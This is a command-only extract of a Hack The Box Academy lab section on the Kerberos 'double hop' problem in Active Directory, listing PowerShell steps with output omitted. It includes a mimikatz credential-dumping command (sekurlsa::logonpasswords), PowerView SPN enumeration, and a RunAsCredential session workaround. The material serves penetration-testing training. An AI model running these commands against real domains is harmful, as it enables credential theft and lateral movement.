# Section 24: Kerberos "Double Hop" Problem

- Module: Active Directory Enumeration & Attacks (143)
- URL: https://academy.hackthebox.com/app/module/143/section/1573
- Code/command blocks: 9

> Terminal output is omitted; only commands & scripts are captured.

## 1. `powershell` _(output omitted)_

```powershell
PS C:\Users\ben.{{DOMAIN_NB}}> Enter-PSSession -ComputerName DEV01 -Credential {{DOMAIN_NB}}\backupadm
cd 'C:\Users\Public\'
.\mimikatz "privilege::debug" "sekurlsa::logonpasswords" exit
```

## 2. `powershell` _(output omitted)_

```powershell
tasklist /V |findstr backupadm
```

## 3. `cmd` _(output omitted)_

```cmd
klist
```

## 4. `powershell`

```powershell
Enter-PSSession -ComputerName ACADEMY-AEN-DEV01.{{DOMAIN_UPPER}} -Credential {{DOMAIN_NB}}\backupadm
```

## 5. `powershell` _(output omitted)_

```powershell
klist
```

## 6. `powershell` _(output omitted)_

```powershell
Import-Module .\PowerView.ps1
get-domainuser -spn | select samaccountname
```

## 7. `powershell` _(output omitted)_

```powershell
Register-PSSessionConfiguration -Name backupadmsess -RunAsCredential {{DOMAIN_NB}}\backupadm
```

## 8. `powershell` _(output omitted)_

```powershell
Enter-PSSession -ComputerName DEV01 -Credential {{DOMAIN_NB}}\backupadm -ConfigurationName  backupadmsess
klist
```

## 9. `powershell` _(output omitted)_

```powershell
get-domainuser -spn | select samaccountname
```